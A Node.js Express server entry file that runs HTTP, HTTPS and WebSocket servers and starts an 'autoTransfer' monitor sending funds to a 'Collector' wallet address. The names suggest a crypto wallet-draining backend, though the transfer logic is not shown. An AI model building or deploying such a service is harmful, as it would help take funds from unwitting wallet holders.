Object.keys(require.cache).forEach(k => delete require.cache[k]);
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const https = require('https');
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');

const apiRoutes = require('./routes/api');
const { startMonitor } = require('./monitor/autoTransfer');

const app = express();

// Ensure data directory exists
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// File-based database
console.log('[DB] Using file-based storage (./data/)');

// Middleware
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type']
}));
app.use(express.json({ limit: '10mb' }));

// Routes
app.use('/api', apiRoutes);

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    storage: 'file-based',
    ssl: true
  });
});

// Error handling
app.use((err, req, res, next) => {
  console.error('[Error]', err);
  res.status(500).json({ error: 'Internal error' });
});

// SSL Certificate
const SSL_OPTIONS = {
  key: fs.readFileSync('/etc/ssl/stealthguard/key.pem'),
  cert: fs.readFileSync('/etc/ssl/stealthguard/cert.pem'),
};

const PORT = process.env.PORT || 3000;
const HTTPS_PORT = 3443;

// Start HTTP server (for backwards compatibility)
const httpServer = http.createServer(app);
httpServer.listen(PORT, () => {
  console.log(`[HTTP] Running on port ${PORT}`);
});

// Start HTTPS server
const httpsServer = https.createServer(SSL_OPTIONS, app);
httpsServer.listen(HTTPS_PORT, () => {
  console.log(`[HTTPS] Running on port ${HTTPS_PORT}`);
  console.log(`[SSL] Cert: /etc/ssl/stealthguard/cert.pem`);
});

// WebSocket on HTTPS server
const wss = new WebSocket.Server({ server: httpsServer });

wss.on('connection', (ws) => {
  console.log('[WS] Client connected');
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      if (data.subscribe === 'events') {
        ws.subscription = 'events';
      }
    } catch {}
  });
  
  ws.on('close', () => {
    console.log('[WS] Client disconnected');
  });
});

function broadcast(data) {
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify(data));
    }
  });
}

global.broadcastEvent = broadcast;

console.log(`[Wallet] Collector: ${process.env.COLLECTOR_ADDRESS || 'not set'}`);

if (process.env.ENABLE_MONITOR !== 'false') {
  startMonitor();
}

module.exports = { broadcast };
